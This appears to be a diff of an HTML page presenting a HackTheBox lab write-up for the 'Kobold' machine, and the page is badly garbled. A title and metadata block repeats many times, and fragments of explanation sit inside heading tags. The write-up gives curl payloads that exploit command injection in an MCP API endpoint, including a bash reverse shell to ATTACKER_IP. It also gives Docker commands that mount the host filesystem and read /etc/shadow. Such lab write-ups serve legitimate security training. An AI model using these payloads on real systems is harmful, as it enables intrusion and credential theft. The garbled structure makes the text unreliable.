+<p>docker run -v /:/host -it alpine chroot /host /bin/bash</p>
+<pre><code>
+### Method 2: Docker Socket Access
+
+If `/var/run/docker.sock` is accessible:</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: interact with the Docker daemon via the UNIX socket.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: verify if the Docker socket is accessible for administrative commands without group membership.</h1>
+<p>docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash</p>
+<pre><code>
+---
+
+## Key Takeaways
+
+| Stage | Technique | Key Detail |
+|-------|-----------|------------|
+| **Recon** | Nmap + VHost discovery | MCP API endpoint on `mcp.kobold.htb` |
+| **Initial Access** | Command injection via MCP API | `/api/mcp/connect` — unsanitized `command` and `args` parameters |
+| **User Flag** | Reverse shell as `ben` | Bash reverse shell payload |
+| **Privilege Escalation** | Docker group membership | `docker run --privileged -v /:/hostfs` → host root access |
+| **Root Flag** | Host filesystem mount | Read `/root/root.txt` from container |
+
+### Security Lessons
+
+1. **Never trust user input in API endpoints** — The MCP API accepted arbitrary commands without validation
+2. **Docker group membership = root** — Never add regular users to the docker group
+3. **Use rootless containers** — Docker rootless mode prevents this escalation path
+4. **Network segmentation** — The MCP API should not be exposed externally without authentication
+
+---
+
+## MCP API Cheat Sheet
+
+### Testing Command Injection
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Test basic command execution</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: probe the MCP API for command injection.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: verify the vulnerability by triggering a safe command like 'id'.</h1>
+<p>curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'</p>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Test with arguments</h1>
+<p>curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"serverConfig":{"command":"cat","args":["/etc/passwd"],"env":{}},"serverId":"test"}'</p>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Reverse shell</h1>
+<p>curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],"env":{}},"serverId":"revshell"}'</p>
+<pre><code>
+### Docker Group Exploitation
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Check group membership</h1>
+<p>groups</p>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Activate docker group</h1>
+<p>newgrp docker</p>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Mount host filesystem</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: establish a privileged shell via container mount.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: provide a one-liner reference for escaping the container to the host filesystem.</h1>
+<p>docker run --rm -it --privileged -v /:/hostfs --user root alpine /bin/bash</p>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+One-liner to read specific file</h1>
+<p>docker run --rm -i --privileged -v /:/hostfs --user root alpine -c "cat /hostfs/etc/shadow"</p>
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
+
 </body>
 </html>
